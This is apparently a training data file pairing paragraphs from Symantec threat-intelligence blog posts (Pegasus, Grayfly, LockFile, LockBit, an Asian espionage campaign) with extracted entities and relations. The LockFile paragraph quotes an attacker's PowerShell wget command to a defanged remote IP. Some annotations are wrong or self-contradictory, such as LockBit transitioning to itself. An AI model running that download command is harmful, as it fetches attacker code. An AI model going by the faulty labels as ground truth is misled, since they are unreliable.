{"instruction": "Symantec solutions help detect, filter, and block the threat. The recent iOS 14.8 update fixes a zero-day, zero-click exploit for a vulnerability affecting every mobile iOS device. The flaw, dubbed FORCEDENTRY (CVE-2021-30860), resided in Apple\u2019s iMessage and, according to a report by The Citizen Lab , was used to push NSO Group\u2019s Pegasus spyware to mobile iOS devices dating back to as far as February 2021. Pegasus has been around for some years now but has been back in the spotlight recently following reports from both The Citizen Lab and Amnesty International about the spyware targeting journalists, activists, and others. One of the main concerns with FORCEDENTRY is that it can be used in what is called a zero-click attack, meaning it requires no user interaction. An attacker exploiting the flaw only needs the Apple ID of a device in order to silently compromise it", "input": null, "output": "Named Entities: (zero-day, threat type), (CVE-2021-30860, vulnerability), (NSO Group\u2019s Pegasus, malware)\nRelationships: No related relations."}
{"instruction": "This post will cover what is currently known about the Pegasus threat, how common it is, and how Symantec, a part of Broadcom Software , is keeping its customers safe from the spyware.", "input": null, "output": "No related entities and relations."}
{"instruction": "The Pegasus Threat Developed by Israeli cyber arms firm NSO Group, Pegasus is a sophisticated and elusive mobile spyware that has been around for some years now. Pegasus has the ability to read messages, track calls, track device location, collect passwords, and access the target device's microphone and camera. According to NSO Group, Pegasus is sold to nation-states and law enforcement to help in the fight against crime and terrorism, and to maintain public safety. Despite this statement, misuse of the software has been flagged over the years and Symantec has had a long-standing capability to detect it. A recent report uncovered attacks exploiting vulnerabilities in Apple's iMessage service in order to install Pegasus. The attack only needs the Apple ID - an email or phone number - to infect the targeted mobile device.", "input": null, "output": "Named Entities: (Pegasus, malware), (NSO Group, attacker)\nRelationships: (Pegasus, developed by, NSO Group)"}
{"instruction": "The attack payload uses iMessage fields that are \"hidden\" from the user; in fact, if the iMessage text field is blank, no alerts or notifications are shown at all. This type of iMessage zero-click attack dates back to iOS 11 and research done by the Google Project Zero team. The payload exploits vulnerabilities in the iMessage framework, such as exploiting the PDF processor by sending a maliciously crafted PDF to achieve arbitrary code execution (fixed in the iOS 14.8 update). Further, the attack execution takes place entirely inside the iMessage framework\u2019s sandbox processes and is wiped when the device restarts.", "input": null, "output": "No related entities and relations."}
{"instruction": "How Common is the Threat? Suffice to say, this makes measuring the scope of the Pegasus threat challenging. The best clue left behind by a FORCEDENTRY attack is the resulting web traffic it generates when it tries to download Pegasus spyware framework files. Reports from Amnesty International listed known Pegasus infection URLs. We ran that list against the Symantec WebPulse URL reputation service used by Symantec Endpoint Protection Mobile to identify and block suspect web traffic. We found close to 1 in 150,000 iOS devices attempting to access a known Pegasus infection URL. While this number might seem low, this is only one part of the kill chain and the list of known infection URLs is by no means exhaustive.", "input": null, "output": "Named Entities: (Pegasus, malware)\nRelationships:No related relations."}
{"instruction": "In any case, Symantec WebPulse was able to identify the URLs as potential risks or malicious, and stop the infection and kill chain - even if it contained zero-day exploits and required zero user clicks - dead in its tracks.", "input": null, "output": "No related entities and relations."}
{"instruction": "How is Symantec Solving the Problem? \nSymantec Endpoint Protection Mobile analyzes links contained within SMS messages, shielding users from attacks by checking URLs (even those that might be hidden to the user) against the threat intelligence in Symantec WebPulse, part of the Symantec Global Intelligence Network. \nSymantec Endpoint Protection Mobile provides protection against network content threats, filtering and blocking communication to known command-and-control servers used in Pegasus campaigns (the same WebPulse global URL intelligence information is embedded in both our Windows and Mac Symantec Endpoint Protection agents ). It can also identify and protect vulnerable iOS & Android devices. For more details around coverage see the Pegasus Spyware Protection Bulletin from the Symantec Security Center. \nPatches for FORCEDENTRY are available for macOS , iOS, iPadOS , and watchOS , and users are advised to apply these patches as soon as possible.", "input": null, "output": "No related entities and relations."}
{"instruction": "Conclusion \nApple addressed the FORCEDENTRY vulnerability quickly with its iOS 14.8 update. However, with the iMessage framework increasingly a target for threat hunters, we expect many more fixes to come. We also expect the number of attacks targeting iOS devices will follow similar attack patterns used by Pegasus. Unfortunately, with limited visibility into the attack payload and kill chain, attackers know they can easily evade detection. \nAll this highlights how important it is to have mobile endpoint protection as part of a layered network defense strategy to prevent known and unknown (zero-day) attacks targeting mobile devices.", "input": null, "output": "Named Entities: (Pegasus, malware)\nRelationships: No related relations."}
{"instruction": "Grayfly: Chinese Threat Actor Uses Newly-discovered Sidewalk Malware", "input": null, "output": "Named Entities: (Grayfly, attacker), (Sidewalk, malware), (Chinese Threat Actor, attacker)\nRelationships: (Grayfly, use, Sidewalk), (Grayfly, associated with, Chinese Threat Actor)"}
{"instruction": "Recent campaigns involved exploits against Exchange and MySQL servers. Group has heavy focus on telecoms sector. Symantec, part of Broadcom Software , has linked the recently discovered Sidewalk backdoor to the China-linked Grayfly espionage group. The malware, which is related to the older Crosswalk backdoor (Backdoor.Motnug) has been deployed in recent Grayfly campaigns against a number of organizations in Taiwan, Vietnam, the United States, and Mexico. A feature of this recent campaign was that a large number of targets were in the telecoms sector. The group also attacked organizations in the IT, media, and finance sectors.", "input": null, "output": "Named Entities: (Sidewalk backdoor, malware), (Grayfly espionage group, attacker), (Crosswalk backdoor, malware), (Backdoor.Motnug, malware)\nRelationships: (Sidewalk backdoor, related to, Crosswalk backdoor), (Sidewalk backdoor, deployed in, Grayfly campaigns)"}
{"instruction": "Sidewalk was recently documented by ESET , who attributed it to a new group it called SparklingGoblin, which it linked to the Winnti malware family. Symantec\u2019s Threat Hunter Team has attributed Sidewalk to Grayfly, a longstanding Chinese espionage operation. Members of the group were indicted in the U.S. in 2020 . The recent campaign involving Sidewalk suggests that Grayfly has been undeterred by the publicity surrounding the indictments.", "input": null, "output": "Named Entities: (Sidewalk, malware), (SparklingGoblin, attacker), (Winnti malware family, malware), (Grayfly, attacker), (Chinese espionage operation, threat type)\nRelationships: (Sidewalk, attributed to, SparklingGoblin), (SparklingGoblin, linked to, Winnti malware family), (Sidewalk, attributed to, Grayfly), (Grayfly, attributed to, Chinese espionage operation)"}
{"instruction": "Who are Grayfly? Grayfly (aka GREF and Wicked Panda) is a targeted attack group that has been active since at least March 2017 using a custom backdoor known as Backdoor.Motnug (aka TOMMYGUN/CROSSWALK), a custom loader called Trojan.Chattak, Cobalt Strike (aka Trojan.Agentemis), and ancillary tools in its attacks. Grayfly has been observed targeting a number of countries in Asia, Europe, and North America across a variety of industries, including food, financial, healthcare, hospitality, manufacturing, and telecommunications. In more recent activity, Grayfly has continued with its focus on telecommunications but has also been observed targeting organizations operating within the media, finance, and IT service provider sectors. Typically Grayfly targets publicly facing web servers to install web shells for initial intrusion, before spreading further within the network.", "input": null, "output": "Named Entities: (Grayfly, attacker), (GREF, attacker), (Wicked Panda, attacker), (Backdoor.Motnug, malware), (TOMMYGUN/CROSSWALK, malware), (Trojan.Chattak, malware), (Cobalt Strike, tool), (Trojan.Agentemis, malware)\nRelationships: (Grayfly, aka, GREF), (Grayfly, aka, Wicked Panda), (Grayfly, use, Backdoor.Motnug), (Backdoor.Motnug, aka, TOMMYGUN/CROSSWALK), (Grayfly, use, Trojan.Chattak), (Grayfly, use, Cobalt Strike)"}
{"instruction": "Once a network has been compromised, Grayfly may install its custom backdoors onto additional systems. These tools allow the attackers to have comprehensive remote access to the network and proxy connections allowing them to access hard-to-reach segments of a target's network. Although sometimes labeled APT41, we consider Grayfly the espionage arm of APT41. Similarly, Symantec tracks other sub-groups of APT41 separately, such as Blackfly, its cyber-crime arm.", "input": null, "output": "Named Entities: (Grayfly, attacker), (custom backdoors, tool), (APT41, attacker), (Blackfly, attacker)\nRelationships: (Grayfly, install, custom backdoors), (Grayfly, labeled as, APT41), (Grayfly, espionage arm of, APT41), (Blackfly, cyber-crime arm of, APT41)"}
{"instruction": "Sidewalk campaign \nA characteristic of the recent campaign was that the group appeared to be particularly interested in attacking exposed Microsoft Exchange or MySQL servers. This suggests that the initial vector may be the exploit of multiple vulnerabilities against public-facing servers. \nIn at least one attack, the suspicious Exchange activity was followed by PowerShell commands used to install an unidentified web shell. Following this, the malicious backdoor was executed. \nAfter the installation of the backdoor, the attackers deployed a custom version of the credential-dumping tool Mimikatz. This version of Mimikatz has been used previously in Grayfly attacks.", "input": null, "output": "Named Entities: (web shell, tool), (backdoor, malware), (Mimikatz, tool), (Grayfly, attacker)\nRelationships: (web shell, executed, backdoor), (backdoor, deploy, Mimikatz), (Mimikatz, used by, Grayfly)"}
{"instruction": "Shortly after this, Mimikatz was executed to dump credentials: sha2:b3eb783b017da32e33d19670b39eae0b11de8e983891dd4feb873d6e9333608d (Mimikatz) - csidl_system_drive\\perflogs\\ulsassx64.exe After this point, no further activity was observed.", "input": null, "output": "Named Entities: (Mimikatz, tool), (b3eb783b017da32e33d19670b39eae0b11de8e983891dd4feb873d6e9333608d, SHA256) (csidl_system_drive\\perflogs\\ulsassx64.exe, file)\nRelationships: (Mimikatz, execute, csidl_system_drive\\perflogs\\ulsassx64.exe), (csidl_system_drive\\perflogs\\ulsassx64.exe, hash, b3eb783b017da32e33d19670b39eae0b11de8e983891dd4feb873d6e9333608d)"}
{"instruction": "Indictments \nThree Chinese men were indicted in the U.S. in 2020 for their involvement in attacks that involved Grayfly tools and tactics. At the time of the indictment, Jiang Lizhi, Qian Chuan, and Fu Qiang were based in the Chinese city of Chengdu and held senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with other security operations. \nThe indictment charged the men with involvement in attacks against over 100 different organizations in the U.S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a \u201cworking relationship\u201d with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection.", "input": null, "output": "Named Entities: (Grayfly, tool), (Chengdu 404, attacker)\nRelationships: (Grayfly, used by, Chengdu 404)"}
{"instruction": "Likely to continue \nGrayfly is a capable actor, likely to continue to pose a risk to organizations in Asia and Europe across a variety of industries, including telecommunications, finance, and media. It's likely this group will continue to develop and improve its custom tools to enhance evasion tactics along with using commodity tools such as publicly available exploits and web shells to assist in their attacks.", "input": null, "output": "Named Entities: (Grayfly, attacker)\nRelationships: No related relations."}
{"instruction": "LockFile: Ransomware Uses PetitPotam Exploit to Compromise Windows Domain Controllers", "input": null, "output": "Named Entities: (LockFile, malware)\nRelationships: No related relations."}
{"instruction": "Previously unseen ransomware hit at least 10 organizations in ongoing campaign. UPDATE August 23 : Third parties have identified a ProxyShell exploit as a potential vector for the PowerShell-related commands that are identified in this blog. Researcher Kevin Beaumont first spotted that ProxyShell was being exploited from 209.14.0[.]234 on August 13. The ProxyShell and LockFile link is also mentioned in this Twitter thread . Protection information has been updated below based on this new information. What appears to be a new ransomware family is being used to target victims in various industries around the globe. The LockFile ransomware was first observed on the network of a U.S. financial organization on July 20, 2021, with its latest activity seen as recently as August 20. LockFile has been seen on organizations around the world, with most of its victims based in the U.S. and Asia.", "input": null, "output": "Named Entities: (ransomware, threat type), (ProxyShell, tool), (209.14.0[.]234, IP), (LockFile ransomware, malware)\nRelationships: (ProxyShell, exploited from, 209.14.0[.]234), (LockFile ransomware, use, ProxyShell)"}
{"instruction": "Indications are that the attackers gain access to victims' networks via Microsoft Exchange Servers, and then use the incompletely patched PetitPotam vulnerability to gain access to the domain controller, and then spread across the network. It is not clear how the attackers gain initial access to the Microsoft Exchange Servers. Victims are in the manufacturing, financial services, engineering, legal, business services, and travel and tourism sectors. The attackers behind this ransomware use a ransom note with a similar design to that used by the LockBit ransomware gang ( Figure 1) and reference the Conti gang in the email address they use - [email protected] [.]com. Figure 1. The LockFile ransom note", "input": null, "output": "Named Entities: (LockBit ransomware gang, attacker), (Conti gang, attacker), ([email protected] [.]com, Domain)\nRelationships: (LockBit ransomware gang, use,  email protected] [.]com), (email protected] [.]com, reference, Conti gang)"}
{"instruction": "Attack chain Exchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command such as the following: powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH Other powershell wget commands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is downloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before beginning the ransomware attack. Typically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server. Included in these tools is: An exploit for the CVE-2021-36942 vulnerability (aka PetitPotam). The code appears to be copied from https://github.com/zcgonvh/EfsPotato . This is in a file called \u201cefspotato.exe\u201d. Two files: active_desktop_render.dll and active_desktop_launcher.exe", "input": null, "output": "Named Entities: (powershell, tool), (hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH, URL), (CVE-2021-36942, vulnerability), (https://github.com/zcgonvh/EfsPotato, URL),  (efspotato.exe, file), (active_desktop_render.dll, file), (active_desktop_launcher.exe, file)\nRelationships: (attacker, execute, powershell), (powershell, wget, hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH), (attacker, exploit, CVE-2021-36942), (attacker, copy from, https://github.com/zcgonvh/EfsPotato), (https://github.com/zcgonvh/EfsPotato, copy, efspotato.exe), (efspotato.exe, has, active_desktop_render.dll), (efspotato.exe, has, active_desktop_launcher.exe)"}
{"instruction": "The active_desktop_launcher.exe is a legitimate version of KuGou Active Desktop. The executable is being used in a DLL search order loading attack to load a malicious active_desktop_render.dll file. This active_desktop_render.dll file, when loaded by the active_desktop_launcher.exe, attempts to load and decrypt a file in the local directory called \u201cdesktop.ini\u201d. If the file is successfully loaded and decrypted, shellcode from the file is executed. As the investigation into these attacks is ongoing, a copy of \u201cdesktop.ini\u201d has yet to be retrieved for analysis. The encrypted shellcode, however, very likely activates the efspotato.exe file that exploits PetitPotam. This is an NTLM relay attack bug that can be used by a low-privileged attacker to take over a domain controller. It was patched in Microsoft\u2019s August Patch Tuesday release, but it subsequently emerged that the fix released reportedly did not fully patch the vulnerability.", "input": null, "output": "Named Entities: (active_desktop_launcher.exe, file), (KuGou Active Desktop, tool), (DLL search order loading attack, threat type), (active_desktop_render.dll, file), (desktop.ini, file), (efspotato.exe, file)\nRelationships: (active_desktop_launcher.exe, version of, KuGou Active Desktop), (active_desktop_launcher.exe, used in, DLL search order loading attack), (active_desktop_launcher.exe, load, active_desktop_render.dll), (active_desktop_render.dll, load and decrypt, desktop.ini), (encrypted shellcode, activates, efspotato.exe)"}
{"instruction": "Once access has been gained to the local domain controller, the attackers copy over the LockFile ransomware, along with a batch file and supporting executables, onto the domain controller. These files are copied into the \u201c sysvol\\domain\\scripts \u201d directory. This directory is used to deploy scripts to network clients when they authenticate to the domain controller. This means that any clients that authenticate to the domain after these files have been copied over will execute them. The files that are copied into the Sysvol directory are: Autologin.bat Autologin.exe Autologin.dll Autologin.sys Autoupdate.exe The Autoupdate.exe file is a variant of the LockFile payload, which is unique to each organization targeted.", "input": null, "output": "Named Entities: (LockFile, malware), (ransomware, threat type), (Autologin.bat, file), (Autologin.exe, file), (Autologin.dll, file), (Autologin.dll, file), (Autoupdate.exe, file)\nRelationships: (LockFile, copy, Autologin.bat), (LockFile, copy, Autologin.exe), (LockFile, copy, Autologin.dll), (LockFile, copy, Autologin.dll), (LockFile, copy, Autoupdate.exe), (Autoupdate.exe, variant of, LockFile)"}
{"instruction": "The Autologin.exe, Autlogin.dll, and Autologin.sys files are all part of a toolkit called the Kernel Driver Utility (KDU - https://github.com/hfiref0x/KDU ). Autologin.dll is the \u201cTanikaze.dll\u201d component, and the autologin.exe is the \u201cHamakaze\u201d component. It is currently unclear exactly how the KDU tool is utilized by the attacker in conjunction with the ransomware. Regardless of how they are utilized, the LockFile ransomware is ultimately executed.", "input": null, "output": "Named Entities: (Autologin.exe, file), (Autlogin.dll, file), (Autologin.sys, file), (Kernel Driver Utility, tool), (KDU, tool), (https://github.com/hfiref0x/KDU, URL), (Tanikaze.dll, file), (LockFile ransomware, malware)\nRelationships: (Autologin.exe, part of, Kernel Driver Utility), (Autlogin.dll, part of, Kernel Driver Utility), (Autologin.sys, part of, Kernel Driver Utility), (Kernel Driver Utility, aka, KDU), (KDU, from, https://github.com/hfiref0x/KDU), (Tanikaze.dll, component of, Autlogin.dll), (KDU, utilized in conjunction with, ransomware)"}
{"instruction": "A new threat? \nLockFile appears to be a new threat on the already crowded ransomware landscape. The investigation into this threat, and whether it may have links to any previously seen or retired ransomware threats continues. This is an ongoing investigation and Symantec, part of Broadcom Software , may update this blog with new information if it comes to light.", "input": null, "output": "No related entities and relations."}
{"instruction": "Affiliates Unlocked: Gangs Switch Between Different Ransomware Families", "input": null, "output": "No related entities and relations."}
{"instruction": "The demise of Sodinokibi has led to a surge in LockBit activity, while there\u2019s evidence affiliates are using multiple ransomware families to achieve their goals. \nThe shutdown of the Leafroller ransomware gang (aka Sodinokibi/REvil) has resulted in a surge in LockBit activity, as some ex-Sodinokibi affiliates move to that ransomware. Meanwhile, there is also more evidence that some attackers are affiliated to more than one ransomware group and are switching between ransomware families mid-attack if the initial ransomware they attempt to deploy fails to execute. \nThese are just the latest developments Symantec, part of Broadcom Software , has seen as ransomware actors continue to evolve their tactics to make their attacks more dangerous and effective.", "input": null, "output": "No related entities and relations."}
{"instruction": "Sodinokibi shutdown leads to LockBit surge Attacks involving the LockBit ransomware have increased markedly over the past month, with some indications that the group behind it is attempting to fill the gap left by the Sodinokibi ransomware. Sodinokibi\u2019s infrastructure and websites disappeared on July 12, 2021 , shortly after the group had carried out a major ransomware attack in which it encrypted approximately 60 managed service providers (MSPs) and more than 1,500 individual businesses using a zero-day vulnerability in the Kaseya VSA remote management software . It\u2019s unclear why exactly the gang\u2019s operations shut down, but it has been speculated that the gang shuttered their activity following either pressure or action by law enforcement.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (LockBit, malware)\nRelationships: (Sodinokibi, lead to surge , LockBit)"}
{"instruction": "Symantec researchers have seen evidence that at least one former Sodinokibi affiliate is now using LockBit. Symantec has observed an attacker using consistent tactics, tools, and procedures (TTPs) attempting to deliver Sodinokibi to victims until July of 2021, when the payload switched to LockBit. LockBit (aka Syrphid) was first seen in September 2019, and launched its ransomware-as-a-service (RaaS) offering in January 2020, however, there was a marked increase in its activity in the last month as it seemingly attempted to recruit former Sodinokibi affiliates.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (LockBit, malware), (Syrphid, malware), (ransomware-as-a-service (RaaS), threat type)\nRelationships: (Sodinokibi, use, LockBit), (LockBit, aka,  Syrphid), (LockBit, launch, ransomware-as-a-service (RaaS))"}
{"instruction": "This recent attack began with a file named mimi.exe, which is an installer that drops a number of password-dumping tools. Immediately prior to the ransomware being launched, a large number of commands were executed to disable various services, block access to remote desktop protocol (RDP), and delete shadow copies. This is activity we typically see before ransomware is deployed on a system. The actor behind this attack consistently named their ransomware payload as svhost.exe and this practice was maintained following their transition to LockBit. The actors behind recent LockBit campaigns were seen using a variety of different TTPs before deploying the ransomware payload, including: DefenderControl.exe \u2013 disables Windows Defender NetworkShare \u2013 scans infected network Nsudo-dropper \u2013 file dropper Credential Stealing \u2013 collecting credentials from infected machines Mimikatz \u2013 credential dumper, used for lateral movement across networks Defoff.bat DelSvc.bat Netscan \u2013 retrieves information about services running on infected machines", "input": null, "output": "Named Entities: (mimi.exe, file), (ransomware, threat type), (svhost.exe, file), (LockBit, malware), (DefenderControl.exe, file), (NetworkShare, tool), (Nsudo-dropper, tool), (Mimikatz, tool), (Defoff.bat, file), (DelSvc.bat, file), (Netscan, tool)\nRelationships: (ransomware, launch, mimi.exe), (ransomware, named as, svhost.exe), (LockBit, transition to, LockBit), (LockBit, use, DefenderControl.exe), (LockBit, use, NetworkShare), (LockBit, use, Nsudo-dropper), (LockBit, use, Mimikatz), (LockBit, use, Defoff.bat), (LockBit, use, DelSvc.bat), (LockBit, use, Netscan)"}
{"instruction": "PasswordRevealer \u2013 shows obfuscated passwords The numerous password-dumping tools used by these attackers indicates that harvesting credentials is a key part of their attack chain.", "input": null, "output": "Named Entities: (PasswordRevealer, tool)\nRelationships: (PasswordRevealer, used by, attackers)"}
{"instruction": "Splitting allegiances In another ransomware attack that occurred in June 2021, it appears that attackers who usually encrypt networks using the Conti ransomware switched payloads and used the Sodinokibi ransomware instead. Initial activity in this attack followed the attackers\u2019 usual playbook, deploying Cobalt Strike, an off-the-shelf remote access tool commonly seen used in ransomware attacks. This would usually be followed by them delivering Conti. Conti first appeared in December 2019 and has been seen used in some high-profile recent ransomware attacks, many targeting healthcare providers, including a May 2021 ransomware attack that crippled Ireland\u2019s public health service provider, the HSE .", "input": null, "output": "Named Entities: (ransomware attack, threat type), (Conti ransomware, malware), (Sodinokibi ransomware, malware), (Cobalt Strike, tool)\nRelationships: (ransomware attack, switch to, Sodinokibi ransomware), (attackers, use, Cobalt Strike), (attackers, deliver, Conti ransomware), (Conti ransomware, used in, high-profile ransomware attacks)"}
{"instruction": "However, in this recent attack, instead of deploying Conti, the attackers switched payloads and deployed Sodinokibi to encrypt several hundred machines on the network. Before Sodinokibi was deployed we saw the attackers use BitsAdmin when moving across the victim network, while they also carried out some other preliminary activity before deploying the ransomware, including disabling Microsoft Defender, disabling RealTime Monitoring, and deleting shadow copies. The attackers maintained a presence on the victim network for approximately three weeks before the Sodinokibi ransomware was deployed.", "input": null, "output": "Named Entities: (Conti, malware), (Sodinokibi, malware), (BitsAdmin, tool)\nRelationships: (attackers, use, BitsAdmin), (attackers, deploy, Sodinokibi)"}
{"instruction": "While not common up to now, this isn\u2019t the first time we have seen evidence of affiliates appearing to have access to more than one ransomware family at the same time. In the attack we talked about in our blog Ransomware: Growing Number of Attackers Using Virtual Machines , there was evidence the attacker had access to both the Mount Locker and Conti ransomware, and may have attempted to run one payload on a virtual machine and, when that didn\u2019t work, ran Mount Locker on the host computer instead.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "Impact Affiliates switching between different ransomware families like this is yet another attempt by ransomware actors to increase the chances of their attacks succeeding, and it will be interesting to see whether or not this is a tactic we start to increasingly observe during ransomware attacks.", "input": null, "output": "No related entities and relations."}
{"instruction": "Having access to multiple ransomware families increases the likelihood of affiliates being able to encrypt machines, increasing the dangers posed by these already dangerous attacks. This is just the latest development we have seen from ransomware actors, who are constantly refining their tactics in order to maximise their profits. The use of virtual machines was another example of attackers tweaking their approach in order to carry out a ransomware attack, while the emergence of double-extortion ransomware attacks last year, where attackers steal data and threaten to release it while also encrypting machines in ransomware attacks, led to one of the biggest shifts we saw in the ransomware landscape in recent times.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related entities and relations."}
{"instruction": "The surge in LockBit activity that we have seen also shows that while some big ransomware names have shut down their operations in recent times, there are many other ransomware operators waiting to fill the space that has been left. Ransomware actors continue to change and refine their tactics in an effort to evade the security steps taken by organizations to stop these types of attacks, which is why ransomware remains one of the biggest threats on the cyber crime landscape in 2021.", "input": null, "output": "Named Entities: (LockBit, malware), (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "Critical Infrastructure Organizations in South East Asia Targeted in Espionage Campaign", "input": null, "output": "Named Entities: (Espionage Campaign, threat type)\nRelationships: No related relations."}
{"instruction": "Attackers made extensive use of living-off-the-land techniques in campaign that lasted several months. Four critical infrastructure organizations in a South East Asian country were targeted in an intelligence-gathering campaign that continued for several months. (Read the whitepaper here .) Among the organizations targeted were a water company, a power company, a communications company, and a defense organization, with evidence the attackers were interested in information about SCADA systems. The attacks were ongoing from at least November 2020 to March 2021, several months before the Colonial Pipeline attack that drew the attention of the world to the danger posed by attacks on critical infrastructure, and may have begun even earlier than that. An attacker gaining access to multiple critical infrastructure organizations in the same country could potentially give malicious actors access to a vast amount of sensitive information.", "input": null, "output": "No related entities and relations."}
{"instruction": "There are numerous indications that the same attacker was behind all the attacks, including: The geographic and sector links of the targeted organizations The presence of certain artifacts on machines in the different organizations, including a downloader (found in two of the organizations), and a keylogger (found in three of the organizations) The same IP address was also seen in attacks on two of the organizations There are some indications that the attacker behind this campaign is based in China, but with the current information available, Symantec cannot attribute the activity to a known actor. Credential theft and lateral movement across victim networks seemed to be a key aim of the attacker, who made extensive use of living-off-the-land tools in this campaign. Among the living-off-the-land or dual-use tools used were: Windows Management Instrumentation (WMI) ProcDump PsExec PAExec Mimikatz", "input": null, "output": "Named Entities: (downloader, tool), (keylogger, tool), (Windows Management Instrumentation, tool), (ProcDump, tool), (PsExec, tool), (PAExec, tool), (Mimikatz, tool)\nRelationships: (attacker, use, living-off-the-land tools), (living-off-the-land tools, include, Windows Management Instrumentation), (living-off-the-land tools, include, ProcDump), (living-off-the-land tools, include, PsExec), (living-off-the-land tools, include, PAExec), (living-off-the-land tools, include, Mimikatz)"}
{"instruction": "Water company The first activity we saw in the attack on this organization was suspicious use of WMI. We then saw a legitimate free multimedia player called PotPlayer Mini being exploited to load a malicious DLL. It has previously been publicly documented that this player is susceptible to DLL search order hijacking, which is not a new technique but is one we see frequently leveraged by attackers to insert malicious files onto victim machines. We saw PotPlayer Mini added as a service to launch a file called potplayermini.exe, we then saw multiple dual-use and hacking tools launched, including: ProcDump PsExec Mimikatz ProcDump was used for credential theft by abusing the LSASS.exe process, and domain shares were enumerated using net view. We then observed a suspected tunneling tool being launched on the system.", "input": null, "output": "Named Entities: (PotPlayer Mini, tool), (potplayermini.exe, file), (ProcDump, tool), (PsExec, tool), (Mimikatz, tool), (tunneling tool, tool)\nRelationships: (PotPlayer Mini, launch, potplayermini.exe), (PotPlayer Mini, launched, ProcDump), (PotPlayer Mini, launched, PsExec), (PotPlayer Mini, launched, Mimikatz), (PotPlayer Mini, launched, tunneling tool)"}
{"instruction": "We did not observe the attackers exfiltrating data from the infected machines. However, the machine the attackers were on did have tools on it that indicate it may have been involved in the design of SCADA systems, indicating this is something the attacker may have been interested in.", "input": null, "output": "No related entities and relations."}
{"instruction": "Power company \nPotPlayer Mini was also exploited on the power company network to carry out DLL search order hijacking, and ProcDump was deployed alongside another payload that we suspect was malware. We also saw the attacker once again carrying out credential theft by using ProcDump of the LSASS.exe process. \nThere were indications that the infected machine in this company may also have been involved in engineering design. \nFile overlap, as well as the similar tactics used, point to the same actor being behind the attacks on the water and power companies.", "input": null, "output": "Named Entities: (ProcDump, tool), (LSASS.exe, file)\nRelationships: (ProcDump, used, LSASS.exe)"}
{"instruction": "Communications company Meanwhile, in the attack on the communications company the attacker exploited a different legitimate tool, Google Chrome Frame, with suspicious files appearing where chrome_frame_helper.exe was the parent file. Google Chrome Frame is a legitimate plugin for Internet Explorer that enables rendering of the full browser canvas using Google Chrome's rendering engine. It wasn\u2019t clear if Google Chrome Frame was already present on the infected machine in this company or if it was introduced by the attacker, as it was the parent file of legitimate as well as suspicious files. PotPlayer Mini also appeared to be exploited on this machine by the attacker for malicious purposes.", "input": null, "output": "Named Entities: (Google Chrome Frame, tool), (chrome_frame_helper.exe, file), (PotPlayer Mini, tool)\nRelationships: (Google Chrome Frame, parent file, chrome_frame_helper.exe)"}
{"instruction": "PAExec, a tool similar to PsExec, launched at.exe (a Windows task scheduler), in order to schedule execution of chrome_frame_helper.exe as a task. WMI was used to run chrome_frame_helper.exe and perform credential theft by dumping LSASS. PAExec and WMIC were also used for lateral movement and to launch chrome_frame_helper.exe against an internal IP address. PAExec also launched it to schedule execution of an unknown batch file as a daily task, and chrome_frame_helper.exe was also used to launch the SharpHound domain trust enumeration tool and other suspicious files. PAExec was also seen executing what appeared to be Mimikatz for suspected credential theft.", "input": null, "output": "Named Entities: (PAExec, tool), (PsExec, tool), (at.exe, file), (chrome_frame_helper.exe, file), (WMIC, tool), (SharpHound, tool), (Mimikatz, tool)\nRelationships: (PAExec, launch, at.exe), (at.exe, schedule execution, chrome_frame_helper.exe), (PAExec, lateral movement, WMIC), (WMIC, launch, chrome_frame_helper.exe), (chrome_frame_helper.exe, launch, SharpHound), (PAExec, execute, Mimikatz)"}
{"instruction": "WMI was also used to run chrome_frame_helper.exe to execute a net.exe command to connect a hidden C$ share. C$ shares are administrator shares that are not visible when viewing another computer's shares, but are accessible to those with administrator privileges on a machine. These types of shares are frequently used by malicious actors to stealthily transfer malware across a network and to collect stolen data. However, it is not clear what the C$ share was used for on this network. We also saw persistence created for chrome_frame_helper.exe as a scheduled task - GoogleUpdateTaskMachineCore4f23 - with the file disguised as chrome_proxy1.exe. A keylogger and several other files seen on the network of this organization were also seen on the network of the water company.", "input": null, "output": "Named Entities: (WMI, tool), (chrome_frame_helper.exe, file), (net.exe, file), (chrome_proxy1.exe, file), (keylogger, tool)\nRelationships: (WMI, run, chrome_frame_helper.exe), (chrome_frame_helper.exe, execute, net.exe), (chrome_frame_helper.exe, disguised as, chrome_proxy1.exe)"}
{"instruction": "Defense organization \nIn the defense organization we once again saw PotPlayer Mini exploited for DLL search order hijacking, as well as seeing some file overlaps between this organization and the communications and water companies.", "input": null, "output": "No related entities and relations."}
{"instruction": "Conclusion While we cannot definitively say what the end goal of the attacker was in these attacks, espionage seems like the likeliest motive. This is indicated by the activity we did see - credential stealing, lateral movement, keyloggers being deployed - and the types of machines targeted in some of the organizations - those involved in design and engineering. The ability of the attacker to maintain a stealthy presence on the targeted networks for a number of months indicates they were skilled. Certain artifacts found on the victim machines indicate the attacker may be based in China, though it is not possible with the information we have to definitively attribute these attacks to a named actor.", "input": null, "output": "Named Entities: (espionage, threat type)\nRelationships: (attacker, motive, espionage)"}
{"instruction": "A skilled malicious actor from a different country gaining a deep insight into a country\u2019s critical infrastructure by compromising multiple critical infrastructure organizations, including a defense organization, could deliver a lot of valuable intelligence into the hands of adversaries. The Colonial Pipeline attack in the U.S. in May 2021 showed the serious repercussions attacks on critical infrastructure can have, and this campaign makes it clear that it is not just U.S. infrastructure that is under threat from malicious actors.", "input": null, "output": "No related entities and relations."}
{"instruction": "Kaseya Ransomware Supply Chain Attack: What You Need To Know", "input": null, "output": "No related entities and relations."}
